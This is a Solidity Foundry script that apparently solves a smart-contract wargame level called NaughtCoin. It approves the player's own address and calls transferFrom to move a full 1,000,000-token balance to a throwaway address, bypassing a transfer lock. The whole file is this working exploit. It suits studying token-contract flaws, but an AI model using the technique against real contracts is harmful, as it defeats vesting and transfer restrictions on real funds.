// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract NaughtCoinScript is Script {
    function run() public {
        NaughtCoin coin = NaughtCoin(0xB8e384fA20A39615a2eFA37Fb3B8827b45b1132e);
        address player = 0xaCab087f7f0977c31d68E8BAe117069a90Dc6574;
        address nobody = makeAddr("nobody");

        vm.startBroadcast();
        coin.approve(player, 1000000000000000000000000);
        coin.transferFrom(player, nobody, 1000000000000000000000000);
        vm.stopBroadcast();

        console.log(coin.balanceOf(player));
    }
}